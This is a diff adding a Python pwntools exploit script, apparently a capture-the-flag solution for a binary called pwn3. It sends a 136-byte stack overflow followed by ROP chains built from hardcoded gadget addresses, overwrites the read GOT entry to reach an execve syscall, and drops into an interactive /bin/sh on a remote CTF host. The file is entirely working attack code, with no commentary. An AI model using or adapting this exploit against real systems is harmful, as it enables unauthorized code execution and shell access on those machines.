@@ -1,0 +1,96 @@
+from pwn import *
+import time
+#p=process("./pwn3")
+step1 = 0x00000000004011b2
+step2 = 0x0000000000401198
+neutre = 0x402e48
+
+main = 0x401122
+bss_binsh=0x4040a0
+pop_rdi=0x00000000004011bb
+pop_rsi_r15=0x00000000004011b9
+read_plt=0x0000000000401030
+read_got=0x404018
+payload=""
+payload+="A"*136
+payload += p64(step1)
+payload += p64(0)
+payload += p64(1)
+payload += p64(1)
+payload += p64(bss_binsh)
+payload += p64(19)
+payload += p64(neutre)
+payload += p64(step2)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(pop_rdi)
+payload += p64(0)
+payload += p64(read_plt)
+payload += p64(main)
+#p = process("./pwn3")
+p = remote("79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com",31337)
+p.sendline(payload)
+time.sleep(1)
+p.sendline("/bin/sh\x00" + p64(read_plt))
+payload=""
+payload+="A"*136
+payload += p64(step1)
+payload += p64(0)
+payload += p64(1)
+payload += p64(0)
+payload += p64(read_got)
+payload += p64(1)
+payload += p64(neutre)
+payload += p64(step2)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(read_plt)
+### starting write call
+payload += p64(step1)
+payload += p64(0)
+payload += p64(1)
+payload += p64(1)
+payload += p64(0x00400000)
+payload += p64(59)
+payload += p64(neutre)
+payload += p64(step2)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(read_plt)
+#agaiin 
+payload += p64(step1)
+payload += p64(0)
+payload += p64(1)
+payload += p64(bss_binsh)
+payload += p64(0)
+payload += p64(0)
+payload += p64(bss_binsh+8)
+payload += p64(step2)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(1)
+payload += p64(0x0000000000401150)
+print len(payload)
+pause()
+p.send(payload)
+time.sleep(1)
+p.sendline("\x7f")
+p.interactive()
